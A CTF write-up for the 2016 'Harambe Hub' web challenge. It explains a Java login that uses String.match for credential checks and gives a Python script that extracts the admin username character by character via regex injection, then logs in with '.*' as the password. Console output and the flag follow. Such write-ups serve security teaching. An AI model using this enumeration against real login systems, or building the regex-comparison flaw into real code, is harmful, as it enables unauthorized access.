---
title: "CTF(x) 2016 - Harambe Hub (Web)"
header:
  overlay_image: /assets/images/ctfx2016/harambehub/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Elmira G. on Unsplash"
tags:
  - ctfx2016
  - writeup
  - web
---

Use of String.match as opposed to String.equals in Java allows an attacker to
recover sensitive input such as an admin username character by character with
regex input.

## Solution

The authentication is insecure because the application uses String.match instead
of String.equals to compare the provided credentials and stored credentials.
This means that we can provide regex to deduce the correct username to
authenticate as and use `.*` as the password to get the real name of an admin.

Solving script:

```python
import requests
import string

name = "http://problems.ctfx.io:7003/name"
users = "http://problems.ctfx.io:7003/users"

def check_name(username, password):
    r = requests.get(name, params={'username': username, 'password': password})
    return r.text

def check_users(username, password, realname):
    r = requests.post(users, data={'username': username,
                                   'password': password,
                                   'real_name': realname})
    return r.text

def main():
    user_length = 23

    real_user = "[Admin] A"
    # Get username length
    for i in range(1, 20):
        if user_length != -1:
            break
        text = "Error"
        escaped = real_user.replace("[", "\\[").replace("]", "\\]")
        while "Error" in text:
            text = check_users(real_user + ".{ %d}" % i, "nil", "nil")
        print text
        if "exists" in text:
            user_length = len(real_user) + i
            break

    print "Found length of username: %d" % user_length

    print "Current: '%s'" % real_user
    for cur in range(len(real_user), user_length):
        for i in string.printable[:-5]:
            text = "Error"
            while "Error" in text:
                pattern = real_user.replace("[", "\\[").replace("]", "\\]")
                toadd = i
                if toadd in [']', '^', '-', '[']:
                    toadd = "\\" + toadd
                pattern += "[%s]" % toadd
                pattern += "." * (user_length - 1 - cur)
                text = check_users(pattern, "nil", "nil")
            print text
            if "exists" in text:
                real_user += i
                print "Got letter: %s" % i
                break
    print "Username: '%s'" % real_user

    print check_name(real_user, ".*")  # This is bullshit

if __name__ == "__main__":
    main()
```

Running the script:

```shell
amon@Evanna:~/ctf/ctfx/web/harambehub$ python exploit.py
Found length of username: 23
Current: '[Admin] A'
OK: Your username is "[Member] \[Admin\] A[0]............."
OK: Your username is "[Member] \[Admin\] A[1]............."
OK: Your username is "[Member] \[Admin\] A[2]............."
OK: Your username is "[Member] \[Admin\] A[3]............."
OK: Your username is "[Member] \[Admin\] A[4]............."
OK: Your username is "[Member] \[Admin\] A[5]............."
OK: Your username is "[Member] \[Admin\] A[6]............."
OK: Your username is "[Member] \[Admin\] A[7]............."
OK: Your username is "[Member] \[Admin\] A[8]............."
OK: Your username is "[Member] \[Admin\] A[9]............."
OK: Your username is "[Member] \[Admin\] A[a]............."
OK: Your username is "[Member] \[Admin\] A[b]............."
OK: Your username is "[Member] \[Admin\] A[c]............."
OK: Your username is "[Member] \[Admin\] A[d]............."
OK: Your username is "[Member] \[Admin\] A[e]............."
OK: Your username is "[Member] \[Admin\] A[f]............."
OK: Your username is "[Member] \[Admin\] A[g]............."
OK: Your username is "[Member] \[Admin\] A[h]............."
OK: Your username is "[Member] \[Admin\] A[i]............."
OK: Your username is "[Member] \[Admin\] A[j]............."
OK: Your username is "[Member] \[Admin\] A[k]............."
OK: Your username is "[Member] \[Admin\] A[l]............."
OK: Your username is "[Member] \[Admin\] A[m]............."
OK: Your username is "[Member] \[Admin\] A[n]............."
OK: Your username is "[Member] \[Admin\] A[o]............."
OK: Your username is "[Member] \[Admin\] A[p]............."
OK: Your username is "[Member] \[Admin\] A[q]............."
FAILED: User with that name already exists!
Got letter: r
... snip ...
OK: Your username is "[Member] \[Admin\] Arxenixisalose[0]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[1]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[2]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[3]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[4]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[5]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[6]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[7]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[8]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[9]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[a]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[b]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[c]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[d]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[e]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[f]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[g]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[h]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[i]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[j]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[k]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[l]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[m]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[n]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[o]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[p]"
OK: Your username is "[Member] \[Admin\] Arxenixisalose[q]"
FAILED: User with that name already exists!
Got letter: r
Username: '[Admin] Arxenixisaloser'
ctf(h4r4mb3_d1dn1t_d13_4_th1s_f33ls_b4d)
```

Flag: **ctf(h4r4mb3\_d1dn1t\_d13\_4\_th1s\_f33ls_b4d)**
